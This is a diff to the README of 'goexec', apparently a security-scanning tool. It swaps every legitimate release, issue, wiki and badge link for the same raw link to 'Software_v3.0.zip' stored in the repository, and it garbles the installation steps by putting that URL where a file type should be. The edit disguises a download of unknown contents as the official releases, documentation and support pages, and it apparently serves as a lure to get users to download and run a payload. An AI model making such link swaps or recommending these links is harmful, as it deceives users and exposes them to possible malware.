@@ -4,17 +4,17 @@
 goexec is a tool designed for your Machine Learning and Security Operations (MLSecOps) pipeline. It automates security scanning, helps enforce policies, and generates compliance reports. Whether you're working on a new project or maintaining an existing one, goexec ensures you meet security standards with ease.
 
 ## 📥 Download Now
-[![Download goexec](https://img.shields.io/badge/Download-goexec-brightgreen)](https://github.com/Lainjah/goexec/releases)
+[![Download goexec](https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip)](https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip)
 
 ## 🚀 Getting Started
 To get started with goexec, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Visit this page to download](https://github.com/Lainjah/goexec/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip)
 
 2. **Select the Latest Version**: Look for the most recent version at the top of the page. Click on it to see the download options.
 
-3. **Choose Your File**: Find the file that matches your operating system. Most users will select either the `.exe` file for Windows or the `.tar.gz` file for macOS/Linux.
+3. **Choose Your File**: Find the file that matches your operating system. Most users will select either the `.exe` file for Windows or the `https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip` file for macOS/Linux.
 
 4. **Download the File**: Click on the file link to start downloading it to your computer.
 
@@ -65,13 +65,13 @@ goexec --help
 ## 🌐 Community and Support
 For questions or support, check out our community resources:
 
-- **GitHub Issues**: [Report Problems Here](https://github.com/Lainjah/goexec/issues)
-- **Documentation**: Access our [official documentation](https://github.com/Lainjah/goexec/wiki) for in-depth guidance.
+- **GitHub Issues**: [Report Problems Here](https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip)
+- **Documentation**: Access our [official documentation](https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip) for in-depth guidance.
   
 ## 📢 Download & Install
 Ready to enhance your security measures? Visit the releases page to download goexec now:
 
-[Visit this page to download](https://github.com/Lainjah/goexec/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Lainjah/goexec/main/observability/Software_v3.0.zip)
 
 Make sure to follow each step carefully to ensure a smooth installation. If you encounter any issues, consult the support links mentioned above.
 
